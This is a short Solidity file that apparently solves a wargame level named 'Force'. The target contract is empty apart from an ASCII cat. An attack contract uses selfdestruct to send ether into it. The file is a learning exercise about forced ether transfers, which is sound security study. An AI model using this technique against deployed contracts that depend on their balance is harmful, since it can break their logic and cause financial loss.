// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceAttack {
    uint balance = 0;

    constructor () public payable {
    }

    function attack(address payable _to) public payable {
        selfdestruct(_to);
    }
}

